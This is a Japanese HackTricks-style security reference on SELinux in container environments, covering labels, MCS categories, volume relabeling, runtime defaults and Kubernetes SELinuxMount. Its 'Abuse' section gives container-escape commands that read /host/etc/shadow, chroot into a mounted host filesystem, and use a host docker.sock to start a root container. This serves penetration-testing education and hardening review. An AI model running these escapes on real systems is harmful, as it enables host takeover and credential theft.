# SELinux

{{#include ../../../../banners/hacktricks-training.md}}

## AppArmor Vs SELinux

SELinuxは**ラベルベースの強制アクセス制御**システムです。関連するすべてのプロセスとオブジェクトにはセキュリティコンテキストを付与でき、ポリシーによって、どのドメインがどのタイプと、どのような方法で相互作用できるかが決定されます。コンテナ化された環境では、通常、runtimeがコンテナプロセスを制限されたコンテナドメインで起動し、対応するタイプでコンテナの内容にラベルを付けます。ポリシーが適切に機能していれば、プロセスは自身のラベルがアクセスすることを想定されている対象を読み書きできますが、mountを通じてその内容が見えるようになった場合でも、他のホスト上の内容へのアクセスは拒否されます。

これは、一般的なLinuxコンテナ環境で利用できる、最も強力なhost-side保護の1つです。Fedora、RHEL、CentOS Stream、OpenShift、その他のSELinux中心のecosystemでは特に重要です。これらの環境では、SELinuxを無視するreviewerは、ホスト侵害への明白に見える経路が実際にはブロックされている理由を誤解しがちです。

## AppArmor Vs SELinux

大まかな違いとして最も分かりやすいのは、AppArmorがpath-basedであるのに対し、SELinuxは**label-based**であることです。これはcontainer securityに大きな影響を与えます。path-basedポリシーでは、同じホスト上の内容が予期しないmount pathで見えるようになった場合に、挙動が変わる可能性があります。一方、label-basedポリシーでは、オブジェクトのラベルが何であり、プロセスドメインがそれに対して何を実行できるかが判断基準になります。これによってSELinuxが単純になるわけではありませんが、AppArmorベースのシステムでdefenderが意図せず想定してしまう、path trickに基づく一種の前提に対して、より堅牢になります。

このモデルはラベルを中心としているため、コンテナのvolume処理とrelabelingの判断はsecurity-criticalです。runtimeまたはoperatorが「mountを機能させる」ためにラベルを広範囲に変更すると、workloadをcontainするはずだったポリシー境界が、意図したものよりはるかに弱くなる可能性があります。

## Lab

ホスト上でSELinuxが有効かどうかを確認するには:
```bash
getenforce 2>/dev/null
sestatus 2>/dev/null
```
host 上の既存のラベルを確認するには:
```bash
ps -eZ | head
ls -Zd /var/lib/containers 2>/dev/null
ls -Zd /var/lib/docker 2>/dev/null
```
通常の実行と、labeling を無効にした場合を比較するには：
```bash
podman run --rm fedora cat /proc/self/attr/current
podman run --rm --security-opt label=disable fedora cat /proc/self/attr/current
```
SELinuxが有効なホストでは、これは非常に実用的なデモンストレーションです。期待されるコンテナドメインで実行されているワークロードと、その強制適用レイヤーを取り除かれたワークロードの違いを示しているためです。

## Runtime Usage

Podmanは、SELinuxがプラットフォームのデフォルトの一部となっているシステムで、SELinuxと特に相性よく動作します。Rootless PodmanとSELinuxの組み合わせは、主流のコンテナ環境における最も強固な基本構成の1つです。ホスト側ではプロセスがすでに非特権であり、さらにMAC policyによって制限されるためです。Dockerも、サポートされている環境ではSELinuxを使用できますが、管理者がvolume labelingに関する扱いにくさを回避するため、SELinuxを無効化することがあります。CRI-OとOpenShiftは、コンテナ分離の仕組みの一部としてSELinuxに大きく依存しています。KubernetesでもSELinux関連の設定を公開できますが、その価値は当然ながら、ノードOSが実際にSELinuxをサポートし、強制適用しているかどうかに左右されます。<sup>[[2]](#references)</sup>

繰り返し得られる教訓は、SELinuxが単なる付加的な機能ではないということです。SELinuxを中心に構築されたエコシステムでは、SELinuxは想定されるsecurity boundaryの一部です。ホスト側のpolicy enumeration、transition analysis、SELinux administration toolsの悪用については、[general SELinux page](../../../interesting-files-permissions/selinux.md)を参照してください。

## MCS Categories and Volume Relabeling

コンテナの分離は通常、**type enforcement**と**Multi-Category Security (MCS)**の組み合わせです。2つのプロセスがどちらも`container_t`として実行されていても、一方には`s0:c123,c456`、もう一方には`s0:c321,c654`のような異なるレベルが割り当てられます。プライベートなコンテナコンテンツには、対応するカテゴリーを持つ`container_file_t`のラベルが付けられるため、別のコンテナのパスに到達しただけではアクセスできません。通常、カテゴリーのペアはruntimeが割り当てます。手動で同じレベルを再利用すると、このコンテナごとの分離が意図的に失われます。<sup>[[3]](#references)</sup>

typeだけを確認するのではなく、process labelとmount labelを比較してください。<sup>[[3]](#references)</sup>
```bash
podman inspect --format 'process={{.ProcessLabel}} mount={{.MountLabel}}' <container>
podman top <container> label
ps -eZ | grep -E 'container_t|spc_t'
ls -Zd /path/to/bind-mount
```
Bind-mount の suffix はホストの inode label を変更するため、単なる mount metadata ではなく security boundary も変更します:<sup>[[3]](#references)</sup>

- `:Z` は container の MCS categories を使用した private label を適用します。1つの container または Pod が所有する volume に適しています。
- `:z` は shared label を適用するため、他の confined container もコンテンツを使用できます（DAC permissions の対象）。secrets や tenant-specific data に使用すると、通常は container を分離する MCS isolation が失われます。
- Relabeling は recursive です。`/`、`/etc`、`/usr`、または home tree 全体などの広範な host tree にいずれかの option を適用すると、選択した container にコンテンツを公開するだけでなく、想定される label が置き換えられた host services が停止する可能性があります。

Manual level reuse は command lines や manifests で容易に発見できます。次の2つの container には意図的に同じ MCS level が付与されているため、その level 用に label されたコンテンツを使用できます:<sup>[[3]](#references)</sup>
```bash
podman run --security-opt label=level:s0:c100,c200 ...
podman run --security-opt label=level:s0:c100,c200 ...
```
また、`label=nested` と `label=disable` は区別する必要があります。前者はコンテナ内部で SELinux operations を公開し、policy で許可されている場合に限って label changes を許可します。一方、後者はその workload に対する label separation を削除します。どちらも確認が必要ですが、同等ではありません。<sup>[[3]](#references)</sup>

## Misconfigurations

典型的な誤りは `label=disable` です。実際には、volume mount が拒否されたため、labeling model を修正する代わりに、SELinux を問題から外すことが最も手早い短期的な対処として選ばれるケースがよくあります。<sup>[[1]](#references)</sup> もう1つの一般的な誤りは、host content の relabeling が不適切であることです。広範な relabel operations によって application は動作するようになるかもしれませんが、container がアクセスできる範囲が、当初の意図を大きく超えて拡大する可能性もあります。

**installed** SELinux と **effective** SELinux を混同しないことも重要です。host が SELinux をサポートしていても permissive mode のままである場合や、runtime が workload を想定された domain で起動していない場合があります。そのようなケースでは、protection は documentation が示唆するものよりはるかに弱くなります。

## Abuse

SELinux が存在しない、permissive である、または workload に対して広範に無効化されている場合、host-mounted paths ははるかに容易に abuse できます。本来なら labels によって制限されるはずの bind mount が、host data や host modification への直接的な経路になる可能性があります。これは、writable volume mounts、container runtime directories、または利便性のために sensitive host paths を公開する operational shortcuts と組み合わさる場合に、特に重要です。

SELinux は、runtime flags が似ているにもかかわらず、ある host では generic breakout writeup がすぐに機能し、別の host では何度試しても失敗する理由を説明できることがよくあります。欠けている要素は namespace や capability ではなく、維持されていた label boundary であることが少なくありません。

最も迅速な実践的確認方法は、active context を比較し、その後、通常なら label によって制限される mounted host paths や runtime directories を probe することです:
```bash
getenforce 2>/dev/null
cat /proc/self/attr/current
find / -maxdepth 3 -name '*.sock' 2>/dev/null | grep -E 'docker|containerd|crio'
find /host -maxdepth 2 -ls 2>/dev/null | head
```
ホストの bind mount が存在し、SELinux のラベリングが無効化または弱められている場合、まず情報漏えいが発生することが多い：
```bash
ls -la /host/etc 2>/dev/null | head
cat /host/etc/passwd 2>/dev/null | head
cat /host/etc/shadow 2>/dev/null | head
```
mount が書き込み可能で、kernel の観点からコンテナが実質的に host-root である場合、次のステップは推測するのではなく、制御された host の変更をテストすることです。
```bash
touch /host/tmp/selinux_test 2>/dev/null && echo "host write works"
ls -l /host/tmp/selinux_test 2>/dev/null
```
SELinux 対応ホストでは、runtime state directory 周辺の label が失われると、直接的な privilege-escalation 経路が露呈する可能性もあります。
```bash
find /host/var/run /host/run -maxdepth 2 -name '*.sock' 2>/dev/null
find /host/var/lib -maxdepth 3 \( -name docker -o -name containers -o -name containerd \) 2>/dev/null
```
これらのコマンドは完全な escape chain の代わりにはなりませんが、ホストデータへのアクセスやホスト側のファイル変更を妨げていたのが SELinux かどうかを、非常に迅速に明らかにできます。

### 完全な例: SELinux 無効 + 書き込み可能なホストマウント

SELinux の labeling が無効で、ホストファイルシステムが `/host` に書き込み可能な状態でマウントされている場合、完全な host escape は通常の bind-mount abuse case になります：
```bash
getenforce 2>/dev/null
cat /proc/self/attr/current
touch /host/tmp/selinux_escape_test
chroot /host /bin/bash 2>/dev/null || /host/bin/bash -p
```
`chroot` が成功すると、コンテナプロセスはホストのファイルシステム上で動作するようになります:
```bash
id
hostname
cat /etc/passwd | tail
```
### 完全な例: SELinux 無効化 + ランタイムディレクトリ

ラベルを無効化した後にワークロードが runtime socket に到達できる場合、escape を runtime に委任できます:
```bash
find /host/var/run /host/run -maxdepth 2 -name '*.sock' 2>/dev/null
docker -H unix:///host/var/run/docker.sock run --rm -it -v /:/mnt ubuntu chroot /mnt bash 2>/dev/null
ctr --address /host/run/containerd/containerd.sock images ls 2>/dev/null
```
関連する重要な点は、SELinux がこの種の host-path または runtime-state へのアクセスをまさに防止していた制御であることが多いということです。

## チェック

SELinux のチェックの目的は、SELinux が有効になっていることを確認し、現在の security context を特定し、対象のファイルやパスが実際にラベルによって制限されているかどうかを確認することです。
```bash
getenforce                              # Enforcing / Permissive / Disabled
ps -eZ | grep -i container              # Process labels for container-related processes
ls -Z /path/of/interest                 # File or directory labels on sensitive paths
cat /proc/self/attr/current             # Current process security context
```
ここで注目すべき点：

- `getenforce` は理想的には `Enforcing` を返すべきです。`Permissive` または `Disabled` の場合、SELinux セクション全体の意味が変わります。
- 現在のプロセスコンテキストが想定外、または広すぎるように見える場合、workload が意図したコンテナポリシーの下で実行されていない可能性があります。
- ホストからマウントされたファイルやランタイムディレクトリに、プロセスが過度に自由にアクセスできるラベルが付いている場合、bind mount ははるかに危険になります。

SELinux 対応プラットフォーム上のコンテナをレビューする際、ラベリングを二次的な詳細として扱わないでください。多くの場合、ホストがまだ compromise されていない主な理由の一つがこれです。

## Runtime のデフォルト

| Runtime / platform | デフォルト状態 | デフォルトの動作 | よくある手動での弱体化 |
| --- | --- | --- | --- |
| Docker Engine | ホストに依存 | SELinux が有効なホストでは SELinux separation を利用できますが、正確な動作はホストおよび daemon の設定に依存します | `--security-opt label=disable`、bind mount の広範な relabeling、`--privileged` |
| Podman | SELinux ホストでは通常有効 | 無効化されていない限り、SELinux システム上の Podman では SELinux separation が通常の構成要素です | `--security-opt label=disable`、`containers.conf` の `label=false`、`--privileged` |
| Kubernetes | SELinux node では runtime によって割り当て；明示的に設定可能 | Pod が label を設定していない場合、runtime は一意の label を割り当てられます。明示的な `securityContext.seLinuxOptions` は Pod/volume の label を制御します。Kubernetes 1.37 では、対象となる volume はデフォルトで SELinux mount labeling を使用します | 重複した MCS level、permissive/disabled node、広範な privileged workload、無差別な `seLinuxChangePolicy: Recursive` <sup>[[2]](#references)[[4]](#references)</sup> |
| CRI-O / OpenShift style deployments | 通常、大きく依存 | これらの環境では、SELinux が node isolation model の中核となっていることがよくあります | access を過度に広げる custom policy、互換性のための labeling の無効化 |

SELinux のデフォルトは seccomp のデフォルトよりも distribution に依存します。Fedora/RHEL/OpenShift-style system では、SELinux が isolation model の中心となっていることがよくあります。SELinux ではない system では、単に存在しません。

## Kubernetes 1.37 の Volume Labeling

Kubernetes 1.37 では `SELinuxMount` が stable となり、デフォルトで有効化されました。対象となる PVC、`seLinuxOptions` を持つ Pod、および `.spec.seLinuxMount: true` を通知する CSI driver に対して、kubelet は runtime にすべての inode を再帰的に relabel するよう要求する代わりに、`-o context=<label>` を使用します。対応していない driver と volume type では、引き続き recursive path が使用されます。これにより、大規模な relabel 処理を回避できるだけでなく、Pod に volume を公開するためだけにすべてのファイルの永続的な label を変更することも回避できます。<sup>[[2]](#references)[[4]](#references)</sup>

mount が持てるこのような context は一つだけです。そのため、同じ node 上で同じ対象 volume を使用する **異なる SELinux label** の Pod は、デフォルトの `MountOption` 動作では共存できなくなります。一方の Pod は `conflicting SELinux labels of volume` エラーとともに `ContainerCreating` の状態に留まります。これは availability の問題であると同時に、workload が MCS boundary を越えて storage を暗黙的に共有していたことを示す有用な兆候でもあります。その共有が意図的なものである場合—たとえば、privileged な `spc_t` Pod と confined な Pod が同じ volume を使用する場合—Pod 単位の compatibility escape hatch は `seLinuxChangePolicy: Recursive` です。runtime がどの path を relabel するのかを理解せずに、これを cluster 全体へ適用しないでください。<sup>[[2]](#references)[[4]](#references)</sup>
```yaml
spec:
securityContext:
seLinuxOptions:
level: "s0:c123,c456"
seLinuxChangePolicy: Recursive
```
クラスター側で役立つチェック:<sup>[[2]](#references)</sup>
```bash
# Drivers that opt in to -o context= volume mounts
kubectl get csidriver -o custom-columns=NAME:.metadata.name,SELINUX_MOUNT:.spec.seLinuxMount

# Explicit levels or recursive-policy exceptions
kubectl get pods -A -o json | jq -r '
.items[] |
select(.spec.securityContext.seLinuxOptions or
.spec.securityContext.seLinuxChangePolicy) |
[.metadata.namespace,.metadata.name,
(.spec.securityContext.seLinuxOptions.level // "-"),
(.spec.securityContext.seLinuxChangePolicy // "MountOption")] | @tsv'

# Start failures and warnings caused by incompatible labels
kubectl get events -A --sort-by=.lastTimestamp |
grep -Ei 'SELinux|conflicting SELinux labels'
```
オプションの kube-controller-manager `selinux-warning-controller` は、互換性のないラベルを持つボリュームを共有する Pod を検出し、`selinux_warning_controller_selinux_volume_conflict` メトリクスを公開します。アップグレード前、またはボリュームのラベル動作を変更する前に有効化して確認してください。これにより、実際のポリシー競合と通常の CSI またはファイルシステムの障害を区別しやすくなります。<sup>[[2]](#references)</sup>

## References

- [1] [Podman ドキュメント: --security-opt=option (label=disable)](https://docs.podman.io/en/v4.6.0/markdown/options/security-opt.html)
- [2] [Kubernetes: Pod またはコンテナの Security Context の設定](https://kubernetes.io/docs/tasks/configure-pod-container/security-context/)
- [3] [Podman run ドキュメント: SELinux labels とボリュームの relabeling](https://docs.podman.io/en/latest/markdown/podman-run.1.html)
- [4] [Kubernetes v1.37 リリース: SELinuxMount と SELinuxChangePolicy](https://kubernetes.io/blog/2026/08/26/kubernetes-v1-37-release/)
{{#include ../../../../banners/hacktricks-training.md}}
